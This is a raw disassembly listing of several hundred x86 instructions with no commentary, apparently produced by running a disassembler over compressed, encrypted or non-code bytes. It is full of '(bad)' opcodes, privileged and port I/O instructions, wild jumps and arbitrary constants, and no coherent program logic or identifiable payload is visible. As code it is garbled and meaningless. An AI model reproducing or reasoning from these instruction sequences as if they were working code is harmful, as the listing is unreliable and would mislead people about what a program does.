  42685d:	xchg   DWORD PTR [ebp+0x4d],ebp
  426860:	adc    eax,0x17f6c799
  426865:	push   ss
  426866:	gs xor eax,0x7978b5b0
  42686c:	ins    BYTE PTR es:[edi],dx
  42686d:	pusha  
  42686e:	rcl    BYTE PTR [edx+0x7d921db4],1
  426874:	cmp    bl,BYTE PTR [ebx]
  426876:	and    al,0xbd
  426878:	jno    0x42687c
  42687a:	fld    QWORD PTR [ebx+0x38]
  42687d:	cmp    al,0x12
  42687f:	inc    esi
  426880:	into   
  426881:	pushf  
  426882:	xchg   edx,eax
  426883:	lods   al,BYTE PTR ds:[esi]
  426884:	into   
  426885:	enter  0x9964,0x98
  426889:	fistp  WORD PTR [esi]
  42688b:	ins    DWORD PTR es:[edi],dx
  42688c:	neg    DWORD PTR [edx+0x27a0c1a5]
  426892:	(bad)
  426895:	push   ss
  426896:	and    al,0x76
  426898:	inc    ebp
  426899:	mov    esi,?
  42689b:	add    DWORD PTR [ecx],0x4ce86732
  4268a1:	std    
  4268a2:	pop    ebp
  4268a3:	mov    edi,0x9f5f78f3
  4268a8:	push   es
  4268a9:	inc    ebp
  4268aa:	jmp    0x426881
  4268ac:	bnd gs jge 0x426857
  4268b0:	inc    esi
  4268b1:	mov    DWORD PTR [eax],edi
  4268b3:	test   al,0x5a
  4268b5:	inc    edx
  4268b6:	call   0x56c4c8d6
  4268bb:	jb     0x426909
  4268bd:	mov    dh,0xf2
  4268bf:	ja     0x4268a7
  4268c1:	loopne 0x426886
  4268c3:	fistp  QWORD PTR ss:[eax]
  4268c6:	aam    0xbb
  4268c8:	add    esi,ebp
  4268ca:	pop    esp
  4268cb:	push   ss
  4268cc:	mov    dh,0xa2
  4268ce:	(bad)  
  4268cf:	xor    al,0x5c
  4268d1:	int    0x77
  4268d3:	mov    edx,0xa88762b5
  4268d8:	push   edi
  4268d9:	mov    ds:0x5aa20781,al
  4268de:	jl     0x426880
  4268e0:	jecxz  0x42695f
  4268e2:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268e4:	mov    bh,0x14
  4268e6:	stos   DWORD PTR es:[edi],eax
  4268e7:	xchg   ebp,eax
  4268e8:	sub    ah,BYTE PTR [edi+0x31]
  4268eb:	ja     0x4268bf
  4268ed:	inc    edi
  4268ee:	daa    
  4268ef:	adc    BYTE PTR [eax+ebp*2],ch
  4268f2:	sbb    eax,0x952cb402
  4268f7:	mov    bl,0x4b
  4268f9:	inc    eax
  4268fa:	daa    
  4268fb:	scas   al,BYTE PTR es:[edi]
  4268fc:	pop    ebx
  4268fd:	sub    ebx,DWORD PTR [esi]
  4268ff:	dec    edi
  426900:	xor    DWORD PTR [ebx-0x1e402bc0],ebp
  426906:	mov    esp,0xa00aeea5
  42690b:	aad    0xe4
  42690d:	xchg   eax,esp
  42690f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426910:	add    ecx,DWORD PTR [edi]
  426912:	cmp    eax,DWORD PTR ds:0xd59eab07
  426918:	add    esi,esi
  42691a:	sti    
  42691b:	and    esi,DWORD PTR [edx-0x67914dc1]
  426921:	push   cs
  426922:	dec    esi
  426923:	mov    esp,0xf0454966
  426928:	fwait
  426929:	fwait
  42692a:	mov    eax,ds:0x4804eff8
  42692f:	mov    cl,BYTE PTR [ebx]
  426931:	je     0x4268d7
  426933:	sti    
  426934:	daa    
  426935:	xchg   BYTE PTR ds:0x8cec7fa7,al
  42693b:	sub    dl,ah
  42693d:	lock or eax,0xe8e5fc82
  426943:	dec    esi
  426944:	mov    edx,0xcaa268ca
  426949:	shr    BYTE PTR [ebx+0x54348929],cl
  42694f:	mov    ebx,0x35d9969c
  426954:	ja     0x42695e
  426956:	in     eax,dx
  426957:	sub    al,al
  426959:	arpl   WORD PTR [eax],ax
  42695b:	shr    BYTE PTR cs:[esp+eax*1+0x53],cl
  426960:	call   0x7705:0xdc1d5a78
  426967:	fiadd  WORD PTR [ecx-0x39]
  42696a:	test   BYTE PTR [ebx+0x655c4c35],cl
  426970:	jmp    0x42697c
  426972:	les    ecx,FWORD PTR [ebx]
  426974:	or     ah,BYTE PTR [esp+esi*2]
  426977:	sbb    ebx,DWORD PTR [eax-0x44]
  42697a:	mov    edi,0xf0997e81
  426980:	aas    
  426981:	shl    bl,cl
  426983:	lahf   
  426984:	cld    
  426985:	mov    WORD PTR [eax-0x71],?
  426988:	fisubr DWORD PTR [ebx+0x4d9177bd]
  42698e:	pop    eax
  42698f:	mov    DWORD PTR [ebx+0xd],eax
  426992:	jne    0x42694d
  426994:	into   
  426995:	dec    edx
  426996:	fdivr  st,st(3)
  426998:	push   0xca4f1a88
  42699d:	pusha  
  42699e:	je     0x426976
  4269a0:	sbb    bh,BYTE PTR [edx]
  4269a2:	aaa    
  4269a3:	mov    ebx,0x5cc89742
  4269a8:	sub    BYTE PTR [ebx-0x10],0xda
  4269ac:	xor    cl,al
  4269ae:	out    0x73,al
  4269b0:	or     BYTE PTR [edx-0x4cc3993a],dh
  4269b6:	pop    edx
  4269b7:	stos   DWORD PTR es:[edi],eax
  4269b8:	sbb    BYTE PTR [ecx],bh
  4269ba:	and    ecx,DWORD PTR [ebp+0x4d]
  4269bd:	inc    eax
  4269be:	or     BYTE PTR [edi+0x2d],ah
  4269c1:	adc    ebp,edi
  4269c3:	mov    dl,0x53
  4269c5:	in     eax,0x6
  4269c7:	jge    0x426955
  4269c9:	xchg   esi,eax
  4269ca:	inc    edx
  4269cb:	(bad)  
  4269cc:	mov    bh,0xda
  4269ce:	into   
  4269cf:	cli    
  4269d0:	dec    eax
  4269d1:	fst    QWORD PTR ds:0x2702b052
  4269d7:	jno    0x426a05
  4269d9:	or     DWORD PTR [edx-0x6d],esp
  4269dc:	std    
  4269dd:	xor    BYTE PTR [ecx-0x3fd0a348],bl
  4269e3:	in     eax,dx
  4269e4:	(bad)  
  4269e5:	in     al,dx
  4269e6:	fiadd  WORD PTR [ebp+0x1d]
  4269ea:	jmp    0x60bbaf03
  4269ef:	push   0x19f7eee1
  4269f4:	jbe    0x4269f1
  4269f6:	adc    eax,0xaef7dff8
  4269fb:	fld    QWORD PTR [ebx+ecx*2]
  4269fe:	inc    ebx
  4269ff:	(bad)  
  426a00:	aas    
  426a01:	xor    eax,0x11ff4b0c
  426a06:	ins    DWORD PTR es:[edi],dx
  426a07:	mov    edi,0x5d5eb066
  426a0c:	push   eax
  426a0d:	scas   eax,DWORD PTR es:[edi]
  426a0e:	in     eax,0x31
  426a10:	inc    DWORD PTR [esi+0x25b1bec4]
  426a16:	cmp    bh,BYTE PTR [edi-0x29]
  426a19:	pushf  
  426a1a:	xlat   BYTE PTR gs:[ebx]
  426a1c:	pop    ss
  426a1d:	cmp    BYTE PTR [esi-0x647dab2d],bl
  426a23:	daa    
  426a24:	lods   al,BYTE PTR ds:[esi]
  426a25:	(bad)  
  426a26:	lods   eax,DWORD PTR cs:[esi]
  426a28:	mov    cl,0x2
  426a2a:	or     esp,DWORD PTR [eax-0x12dbf752]
  426a30:	adc    BYTE PTR [eax+0x10],ch
  426a33:	mov    dh,0xfb
  426a35:	xor    ebx,DWORD PTR [ebp-0x4e8a9eb7]
  426a3b:	xchg   DWORD PTR [eax],ebx
  426a3d:	push   eax
  426a3e:	popf   
  426a3f:	xchg   ebp,eax
  426a40:	int3   
  426a41:	cmp    bl,BYTE PTR [edx-0x75]
  426a44:	push   eax
  426a45:	fcom   st(0)
  426a47:	std    
  426a48:	xor    eax,0xeb000cd5
  426a4d:	mov    esi,0xd41c5ae5
  426a52:	stos   BYTE PTR es:[edi],al
  426a53:	stos   BYTE PTR es:[edi],al
  426a54:	or     al,0xe3
  426a56:	fs xor al,0xe5
  426a59:	dec    ecx
  426a5a:	push   ss
  426a5b:	cmc    
  426a5c:	ds push eax
  426a5e:	cmp    esp,DWORD PTR ss:[ecx+0x28ebcf25]
  426a65:	pop    ds
  426a66:	mov    ecx,0x2941597a
  426a6b:	push   ds
  426a6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a6d:	in     eax,0x21
  426a6f:	pushw  0xa02d
  426a73:	(bad)
  426a76:	cli    
  426a77:	cmp    eax,0xb10a014c
  426a7c:	ret    
  426a7d:	mov    al,ds:0x3056ae29
  426a82:	test   ecx,0xc3a68929
  426a88:	cmp    eax,0x670e026b
  426a8d:	shl    BYTE PTR [edx+0xf75dad7],0x84
  426a94:	pop    edx
  426a95:	daa    
  426a96:	popa   
  426a97:	pop    esi
  426a98:	xchg   ebp,eax
  426a99:	xor    eax,0xe176ce03
  426a9e:	xchg   BYTE PTR [ecx-0x2],ah
  426aa1:	fdiv   st,st(5)
  426aa3:	mov    al,0xeb
  426aa5:	push   ss
  426aa6:	push   es
  426aa7:	ins    BYTE PTR es:[edi],dx
  426aa8:	stos   BYTE PTR es:[edi],al
  426aa9:	ins    DWORD PTR es:[edi],dx
  426aaa:	cmc    
  426aab:	fadd   DWORD PTR [esi+0x5d]
  426aae:	je     0x426a40
  426ab0:	test   al,0x7b
  426ab2:	ror    DWORD PTR gs:[esi],1
  426ab5:	inc    ebp
  426ab6:	or     BYTE PTR ds:0x9d8ac4d1,0xb1
  426abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426abe:	sub    al,0xf4
  426ac0:	sysret 
  426ac2:	das    
  426ac3:	test   BYTE PTR [eax],bh
  426ac5:	inc    edi
  426ac6:	in     al,0xe4
  426ac8:	rol    DWORD PTR ds:0x59782c70,0x9b
  426acf:	push   ss
  426ad0:	idiv   DWORD PTR [ecx]
  426ad2:	or     eax,0x32052cec
  426ad7:	inc    esp
  426ad8:	inc    ebp
  426ad9:	sbb    ah,BYTE PTR [eax]
  426adb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426adc:	cld    
  426add:	xor    dh,BYTE PTR [edx+esi*2+0x78588f7b]
  426ae4:	mov    cs,WORD PTR [esi-0x1]
  426ae7:	in     eax,0x91
  426ae9:	xchg   DWORD PTR [edi+0x7c30f9c],ebx
  426aef:	aam    0x5d
  426af1:	aas    
  426af2:	xor    BYTE PTR [eax+edi*8+0x2d],bl
  426af6:	sbb    eax,0x547ebaf3
  426afb:	loope  0x426b5c
  426afd:	push   eax
  426afe:	xlat   BYTE PTR ds:[ebx]
  426aff:	sub    BYTE PTR [ebx+0x21],dh
  426b02:	jb     0x426b1d
  426b04:	dec    ebp
  426b05:	lock ret 
  426b07:	sub    esp,DWORD PTR [esi+0xc]
  426b0a:	lds    eax,FWORD PTR [esp-0x18]
  426b0e:	mov    al,ds:0x28d88d13
  426b13:	mov    ecx,0xa7143250
  426b18:	mov    ebx,0x1cc961d2
  426b1d:	int    0x63
  426b1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b20:	xchg   ebx,eax
  426b21:	jmp    DWORD PTR [edi+0x5b]
  426b24:	mov    ds:0xa0688869,al
  426b29:	aas    
  426b2a:	scas   eax,DWORD PTR es:[edi]
  426b2b:	not    BYTE PTR [edi-0x2ea65f02]
  426b31:	xchg   ecx,eax
  426b32:	dec    edx
  426b33:	xlat   BYTE PTR ds:[ebx]
  426b34:	stc    
  426b35:	cmp    dl,bl
  426b37:	mov    BYTE PTR [eax],cl
  426b39:	mov    ds:0xe081bc69,eax
  426b3e:	mov    ah,BYTE PTR [eax]
  426b40:	es jae 0x426adc
  426b43:	dec    ebx
  426b44:	daa    
  426b45:	xchg   DWORD PTR [edi-0x3f],ecx
  426b48:	mov    esi,DWORD PTR [esi]
  426b4a:	popa   
  426b4b:	pop    ss
  426b4c:	inc    ebp
  426b4d:	xor    al,0xbe
  426b4f:	or     BYTE PTR [ebx-0x61],ch
  426b52:	dec    eax
  426b53:	inc    ecx
  426b54:	add    al,0x78
  426b56:	mov    dh,0xa9
  426b58:	pop    edi
  426b59:	or     eax,0x3653076c
  426b5e:	dec    edx
  426b5f:	lock in eax,dx
  426b61:	xor    ebp,ecx
  426b63:	in     eax,0x93
  426b65:	dec    edx
  426b66:	sub    dh,BYTE PTR [ebp+edi*8-0x72946e2c]
  426b6d:	iret   
  426b6e:	out    0xd4,al
  426b70:	jl     0x426b6c
  426b72:	loop   0x426be9
  426b74:	fld    TBYTE PTR [edx-0x279efcf6]
  426b7a:	sbb    ecx,DWORD PTR [ebp+0x6e177e37]
  426b80:	lods   al,BYTE PTR ds:[esi]
  426b81:	bound  cx,DWORD PTR [edi]
  426b84:	add    BYTE PTR [eax],al
  426b86:	add    BYTE PTR [eax],al
  426b88:	add    BYTE PTR [eax],al
  426b8a:	inc    edi
  426b8b:	push   esi
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0x5881,0xc0
  426b98:	popa   
  426b99:	jg     0x426b91
  426b9b:	clc    
  426b9c:	add    DWORD PTR [eax],eax
  426b9e:	add    BYTE PTR [esi],0x0
  426ba1:	add    BYTE PTR [ecx+0x150ce0ba],bh
  426ba7:	repnz ins BYTE PTR es:[edi],dx
  426ba9:	sbb    cl,ah
  426bab:	imul   ecx,DWORD PTR [esp+edi*1+0x60],0xd33b6395
  426bb3:	in     eax,0x4b
  426bb5:	mov    eax,DWORD PTR [edi+ebp*2+0x3c8deaec]
  426bbc:	pop    ss
  426bbd:	sub    BYTE PTR [edi-0x11],ah
  426bc0:	inc    edi
  426bc1:	add    DWORD PTR ds:0xef66604,ecx
  426bc7:	mov    esp,0xe30e3957
  426bcc:	push   edx
  426bcd:	in     al,dx
  426bce:	lods   eax,DWORD PTR ds:[esi]
  426bcf:	xchg   ebx,eax
  426bd0:	pushf  
  426bd1:	push   esp
  426bd2:	stc    
  426bd3:	push   ebx
  426bd4:	push   ebp
  426bd5:	int    0x93
  426bd7:	imul   edx,DWORD PTR [edx-0x62],0xbbfb9a1e
  426bde:	lock mov cl,ch
  426be1:	xor    DWORD PTR [edi+0x3f5c310b],edi
  426be7:	push   eax
  426be8:	iret   
  426be9:	outs   dx,DWORD PTR ds:[esi]
  426bea:	call   FWORD PTR [ecx+0x34]
  426bed:	inc    ebp
  426bef:	fwait
  426bf0:	dec    esp
  426bf1:	popa   
  426bf2:	cmc    
  426bf3:	xchg   edi,eax
  426bf4:	inc    ebx
  426bf5:	aaa    
  426bf6:	or     al,0x4a
  426bf8:	dec    ebp
  426bf9:	pop    ss
  426bfa:	jmp    0x4a33:0xc8880db
  426c01:	or     DWORD PTR [ebx+0x2],ecx
  426c04:	adc    eax,0x73fb917e
  426c09:	dec    esp
  426c0a:	sti    
  426c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c0c:	mov    ds:0xc9f45604,al
  426c11:	add    DWORD PTR [edi-0x64fdc0b3],esi
  426c17:	xchg   edx,eax
  426c18:	mov    bl,0xfb
  426c1a:	mov    al,ds:0x600fd61f
  426c1f:	jne    0x426c91
  426c21:	fmul   DWORD PTR [ebx-0x22fd6c47]
  426c27:	cmove  ecx,DWORD PTR [esi-0x7c]
  426c2b:	jl     0x426c9e
  426c2d:	cmp    DWORD PTR ds:0xdd9e9b67,ebx
  426c33:	int3   
  426c34:	stc    
  426c35:	jl     0x426c0f
  426c37:	fidivr DWORD PTR [esi]
  426c39:	cld    
  426c3a:	(bad)  
  426c3b:	fsubr  st(5),st
  426c3d:	out    dx,al
  426c3e:	enter  0x3ddf,0x30
  426c42:	vandnps xmm0,xmm2,xmm2
  426c46:	test   BYTE PTR [edi-0x3d],ch
  426c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c4a:	cmp    al,0x93
  426c4c:	repz dec ecx
  426c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c4f:	mov    WORD PTR [edi+0x37],ss
  426c52:	std    
  426c53:	enter  0xe3ce,0x92
  426c57:	dec    ecx
  426c58:	cmp    al,0x5a
  426c5a:	dec    edi
  426c5b:	je     0x426c77
  426c5d:	mov    dh,0xe1
  426c5f:	sti    
  426c60:	data16 sti 
  426c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c63:	rcl    DWORD PTR [edx-0x259a59f3],0xf3
  426c6a:	xor    al,0xa7
  426c6c:	idiv   eax
  426c6e:	mov    bh,0x5
  426c70:	sar    BYTE PTR [eax-0x4fda48b0],0x3f
  426c77:	sbb    al,cl
  426c79:	pop    edi
  426c7a:	mov    ch,0xd2
  426c7c:	mov    esi,DWORD PTR [edi-0x8]
  426c7f:	xchg   BYTE PTR [eax+ecx*1],dh
  426c82:	sti    
  426c83:	sbb    DWORD PTR [ecx],0x679308ed
  426c89:	cmp    BYTE PTR [edx],al
  426c8b:	cld    
  426c8c:	xor    BYTE PTR [ebx],ch
  426c8e:	dec    ebx
  426c8f:	pop    esi
  426c90:	sahf   
  426c91:	or     BYTE PTR [ebp-0x3b46de82],dl
  426c97:	and    al,0x4b
  426c99:	jecxz  0x426cbc
  426c9b:	in     eax,dx
  426c9c:	pop    edx
  426c9d:	shl    DWORD PTR [edx],cl
  426c9f:	fcom   DWORD PTR [edx+0x7f76d28c]
  426ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ca6:	jmp    0x426cf4
  426ca8:	adc    DWORD PTR [eax+0x6bb965f1],esp
  426cae:	sti    
  426caf:	imul   ecx,ecx,0xffffffed
  426cb2:	fsub   QWORD PTR [eax]
  426cb4:	out    0x96,al
  426cb6:	adc    al,0x48
  426cb8:	fwait
  426cb9:	cld    
  426cba:	addr16 dec ebx
  426cbc:	fmul   st,st(0)
  426cbe:	lea    edi,[eax-0x65752f74]
  426cc4:	xchg   ebx,eax
  426cc5:	cdq    
  426cc6:	popf   
  426cc7:	ds inc edx
  426cc9:	or     edi,eax
  426ccb:	rol    BYTE PTR [edx+0x49],1
  426cce:	(bad)  
  426ccf:	jae    0x426cec
  426cd1:	lock mov dl,0x8b
  426cd4:	popa   
  426cd5:	xchg   edi,eax
  426cd6:	test   al,0xce
  426cd8:	shl    dl,1
  426cda:	and    al,0x81
  426cdc:	and    BYTE PTR [edx-0x741af460],bl
  426ce2:	adc    al,BYTE PTR [esi]
  426ce4:	cli    
  426ce5:	inc    ecx
  426ce6:	test   eax,0x517f7424
  426ceb:	cmp    al,0xb1
  426ced:	hlt    
  426cee:	jno    0x426c73
  426cf0:	pop    es
  426cf1:	sti    
  426cf2:	ins    DWORD PTR es:[edi],dx
  426cf3:	in     al,dx
  426cf4:	mov    dl,0xa4
  426cf6:	xlat   BYTE PTR ds:[ebx]
  426cf7:	int    0x72
  426cf9:	cmp    DWORD PTR ds:0xd2941636,esi
  426cff:	arpl   bp,cx
  426d01:	add    esp,ebx
  426d03:	push   ecx
  426d04:	test   al,0xd7
  426d06:	pusha  
  426d07:	and    DWORD PTR [ebp+ebx*4+0x5e],esi
  426d0b:	sub    DWORD PTR [esi+ecx*4],ecx
  426d0e:	mov    dl,0xa
  426d10:	je     0x426d57
  426d12:	test   al,0x22
  426d14:	xor    eax,0xe099a962
  426d19:	lds    ebx,FWORD PTR gs:[ecx+0x74]
  426d1d:	jne    0x426d8d
  426d1f:	mov    BYTE PTR [edi+0x2b],cl
  426d22:	and    eax,0xa5b9860c
  426d27:	jo     0x426d28
  426d29:	xchg   edx,eax
  426d2a:	mov    bl,0x7
  426d2c:	and    DWORD PTR [edx+eiz*8+0x159cfa8b],edi
  426d33:	mov    ebx,0x6574cd6a
  426d38:	fmul   QWORD PTR [ecx+0x6d]
  426d3b:	push   edx
  426d3c:	dec    eax
  426d3d:	ds (bad) 
  426d3f:	out    dx,al
  426d40:	fs dec ecx
  426d42:	xchg   esi,eax
  426d43:	push   edi
  426d44:	aaa    
  426d45:	scas   al,BYTE PTR es:[edi]
  426d46:	aad    0xc
  426d48:	mov    cs:0x4d0b46ac,al
  426d4e:	imul   esi,DWORD PTR [ecx+0x19],0x57ac079f
  426d55:	cmp    al,0x25
  426d57:	pop    esi
  426d58:	sbb    DWORD PTR [ecx],edx
  426d5a:	ins    BYTE PTR es:[edi],dx
  426d5b:	es stos BYTE PTR es:[edi],al
  426d5d:	xchg   edi,eax
  426d5e:	or     DWORD PTR [edi+0x41e792f3],0xdc18f22a
  426d68:	jbe    0x426d33
  426d6a:	bsf    esp,DWORD PTR [edi]
  426d6d:	hlt    
  426d6e:	ins    DWORD PTR es:[edi],dx
  426d6f:	inc    edi
  426d70:	and    DWORD PTR [eax],edi
  426d72:	sbb    edi,esp
  426d74:	jno    0x426d6d
  426d76:	adc    bl,dl
  426d78:	push   ss
  426d79:	and    dh,BYTE PTR [eax+0x79736f3a]
  426d7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d80:	xor    eax,0xf1744f39
  426d85:	fadd   DWORD PTR [edx+0x42599638]
  426d8b:	adc    esi,DWORD PTR [edx+eiz*4]
  426d8e:	pop    ebx
  426d8f:	aas    
  426d90:	shl    edi,cl
  426d92:	cld    
  426d93:	aaa    
  426d94:	mov    ch,0x60
  426d96:	xchg   DWORD PTR ds:0x184555e1,ecx
  426d9c:	addr16 daa 
  426d9e:	mov    esp,0x2d4edf5a
  426da3:	or     DWORD PTR ds:0x462abeda,ebp
  426da9:	mov    ebp,0xd83873b8
  426dae:	rcr    BYTE PTR [esi+ecx*4],cl
  426db1:	scas   al,BYTE PTR es:[edi]
  426db2:	cli    
  426db3:	inc    ebp
  426db4:	add    al,BYTE PTR [ebp*4-0x720b8abc]
  426dbb:	(bad)  
  426dbc:	lock mov ecx,0x22ed572
  426dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426dc3:	inc    ebx
  426dc4:	add    al,0x0
  426dc6:	loope  0x426d4d
  426dc8:	jmp    0x426d75
  426dca:	inc    eax
  426dcb:	hlt    
  426dcc:	adc    BYTE PTR [ebx-0x59b35e63],0xc9
  426dd3:	adc    DWORD PTR [esi+0x32b90077],esp
  426dd9:	inc    ebp
  426dda:	std    
  426ddb:	push   ss
  426ddc:	into   
  426ddd:	cmp    ebp,DWORD PTR [esi+0x24db7699]
  426de3:	sub    ch,ch
  426de5:	jne    0x426e40
  426de7:	jmp    0x22399cf0
  426dec:	les    ecx,FWORD PTR [eax+esi*8-0x7821e415]
  426df3:	adc    ebx,DWORD PTR [eax+0x442de74e]
  426df9:	adc    ch,bl
  426dfb:	xor    eax,0x6b39895a
  426e00:	xchg   edi,eax
  426e01:	test   ecx,edx
  426e03:	out    dx,al
  426e04:	or     eax,0xc255a532
  426e09:	xor    esp,DWORD PTR ds:0x2a15e44
  426e0f:	xchg   ebp,eax
  426e10:	mov    al,0xd8
  426e12:	retf   
  426e13:	sbb    al,0xc
  426e15:	ins    DWORD PTR es:[edi],dx
  426e16:	aaa    
  426e17:	pop    esi
  426e18:	pop    edi
  426e19:	mov    al,0xf7
  426e1b:	pop    eax
  426e1c:	es ret 0xb053
  426e20:	cld    
  426e21:	lds    eax,FWORD PTR [edi+eax*8-0x70]
  426e25:	push   0x5c
  426e27:	push   esi
  426e28:	xchg   ebp,eax
  426e29:	sti    
  426e2a:	xor    DWORD PTR [esi-0x42ec0ed3],edx
  426e30:	je     0x426e7b
  426e32:	push   ebx
  426e33:	psubw  mm5,QWORD PTR [ecx]
  426e36:	xchg   edi,eax
  426e37:	dec    ecx
  426e38:	mov    WORD PTR [ebx-0x59],fs
  426e3b:	pushf  
  426e3c:	dec    edx
  426e3d:	and    dh,BYTE PTR [edx]
  426e3f:	pop    ebp
  426e40:	xchg   edi,eax
  426e41:	mov    ecx,0xe6a46b29
  426e46:	push   cs
  426e47:	and    al,0xb1
  426e49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e4a:	fsub   DWORD PTR [ebp-0x7f345757]
  426e50:	xor    eax,DWORD PTR [eax+0x52410b92]
  426e56:	pop    di
  426e58:	mov    edi,0x69c48cc1
  426e5d:	(bad)  
  426e5e:	xchg   esi,eax
  426e5f:	(bad)  
  426e60:	sahf   
  426e61:	jl     0x426e16
  426e63:	outs   dx,BYTE PTR ds:[esi]
  426e64:	push   0x435cd5b8
  426e69:	mov    bh,0x87
  426e6b:	pop    es
  426e6c:	outs   dx,DWORD PTR ds:[esi]
  426e6d:	xor    esp,esp
  426e6f:	sar    cl,cl
  426e71:	inc    edi
  426e72:	push   eax
  426e73:	cs (bad) 
  426e76:	retf   
  426e77:	mov    gs,ecx
  426e79:	sub    DWORD PTR [bx+si],edx
  426e7c:	xchg   ebx,eax
  426e7d:	in     eax,dx
  426e7e:	xlat   BYTE PTR ds:[ebx]
  426e7f:	adc    ch,BYTE PTR [ebx-0x31]
  426e82:	std    
  426e83:	xchg   esi,eax
  426e84:	imul   esp,DWORD PTR [bp+si-0x42a2],0xec7d4e5e
  426e8d:	cs in  eax,dx
  426e8f:	shl    BYTE PTR ds:0x5a5511fb,cl
  426e95:	pushf  
  426e96:	xchg   esp,eax
  426e97:	adc    ecx,DWORD PTR [edx+0x64]
  426e9a:	push   edi
  426e9b:	xchg   esi,eax
  426e9c:	mov    dl,0xc1
  426e9e:	jle    0x426e6f
  426ea0:	aaa    
  426ea1:	jns    0x426f0c
  426ea3:	lock ss and al,0xd0
  426ea7:	sahf   
  426ea8:	push   0xbfe99866
  426ead:	pushf  
  426eae:	test   DWORD PTR [ebx-0x4c07cb97],esp
  426eb4:	mov    ah,dh
  426eb6:	leave  
  426eb7:	xchg   edx,eax
  426eb8:	aad    0x24
  426eba:	mov    eax,0xf16ea889
  426ebf:	mov    eax,ds:0x742eebf6
  426ec4:	dec    esi
  426ec5:	(bad)  
  426ec6:	cmp    al,0x89
  426ec8:	(bad)  
  426ec9:	fistp  QWORD PTR [ecx+ebp*4-0x47]
  426ecd:	xchg   edi,eax
  426ece:	cwde   
  426ecf:	ins    BYTE PTR es:[edi],dx
  426ed0:	mov    ah,0x90
  426ed2:	add    DWORD PTR [ecx-0x25],ecx
  426ed5:	imul   edi,DWORD PTR [ebx+0x5bbb27e],0xffffff97
  426edc:	enter  0x5eba,0xa9
  426ee0:	mov    si,0x2a4a
  426ee4:	sub    ecx,DWORD PTR [ecx-0x1f7099c4]
  426eea:	mov    ah,0xdd
  426eec:	lock fld DWORD PTR [esi]
  426eef:	xor    al,0x8b
  426ef1:	ficom  WORD PTR ds:0x235f39fb
  426ef7:	pop    ecx
  426ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ef9:	mov    ch,0xf2
  426efb:	push   ebp
  426efc:	mov    ebp,0x9e2a9573
  426f01:	add    ch,BYTE PTR [edx-0x27]
  426f04:	pusha  
  426f05:	push   es
  426f06:	pop    edi
  426f07:	scas   al,BYTE PTR es:[edi]
  426f08:	ins    DWORD PTR es:[edi],dx
  426f09:	pop    edi
  426f0a:	mov    bl,0xff
  426f0c:	dec    eax
  426f0d:	xchg   esi,eax
  426f0e:	std    
  426f0f:	jp     0x426f68
  426f11:	adc    al,0x32
  426f13:	into   
  426f14:	and    al,0xcb
  426f16:	mov    WORD PTR [ebp-0x2a7c7bd],es
  426f1c:	sar    DWORD PTR [esi+ecx*1+0x2c],1
  426f20:	cwde   
  426f21:	(bad)  
  426f22:	pop    ss
  426f23:	mov    ds:0x883dfac6,eax
  426f28:	out    0xb1,eax
  426f2a:	shl    DWORD PTR [edi+0x4407dd8b],1
  426f30:	push   es
  426f31:	out    dx,eax
  426f32:	lea    esi,[esi]
  426f34:	dec    eax
  426f35:	loope  0x426ed0
  426f37:	leave  
  426f38:	lds    edi,FWORD PTR [ecx]
  426f3a:	retf   0x496
  426f3d:	out    dx,al
  426f3e:	mov    edi,0xdbf4e83f
  426f43:	jae    0x426f18
  426f45:	xor    BYTE PTR [ebx-0x1bc43743],bh
  426f4b:	sbb    bh,BYTE PTR [edi-0x4b5e0d8a]
  426f51:	pop    eax
  426f52:	mov    cl,0x3b
  426f54:	cmc    
  426f55:	jecxz  0x426f5f
  426f57:	cmp    DWORD PTR [esi+0x447bfa0f],edx
  426f5d:	push   ecx
  426f5e:	les    ecx,FWORD PTR [ecx-0x47]
  426f61:	adc    bh,BYTE PTR [ecx-0x78]
  426f64:	inc    si
  426f66:	data16 sti 
  426f68:	cmc    
  426f69:	bound  esi,QWORD PTR [esi-0x27]
  426f6c:	mov    ebx,0x2d6b278e
  426f71:	jge    0x426f84
  426f73:	xor    edi,DWORD PTR [ecx+ecx*8]
  426f76:	fs data16 add al,0x46
  426f7a:	jecxz  0x426eff
  426f7c:	aad    0x8b
  426f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f7f:	jbe    0x426f9a
  426f81:	inc    eax
  426f82:	sub    BYTE PTR [edx+0x55560444],bl
  426f88:	in     al,dx
  426f89:	dec    esp
  426f8a:	test   esi,edx
  426f8c:	fcom   QWORD PTR ds:0xde038b80
  426f93:	cs pushf 
  426f95:	jecxz  0x426fb1
  426f97:	retf   0x3fe3
  426f9a:	cdq    
  426f9b:	sbb    al,0xd3
  426f9d:	add    BYTE PTR [ecx],ch
  426f9f:	xchg   edi,eax
  426fa0:	in     al,dx
  426fa1:	test   al,0x3
  426fa3:	lods   al,BYTE PTR ds:[esi]
  426fa4:	pop    esp
  426fa5:	pusha  
  426fa6:	outs   dx,DWORD PTR ds:[esi]
  426fa7:	(bad)  
  426fa8:	inc    eax
  426fa9:	retf   
  426faa:	data16 jp 0x427009
  426fad:	ret    
  426fae:	dec    ebp
  426faf:	mov    bl,0x46
  426fb1:	ret    0x8244
  426fb4:	pusha  
  426fb5:	add    dl,BYTE PTR [ebp+0x5e]
  426fb8:	and    BYTE PTR [esi-0x6f],dl
  426fbb:	stos   DWORD PTR es:[edi],eax
  426fbc:	loop   0x426ff1
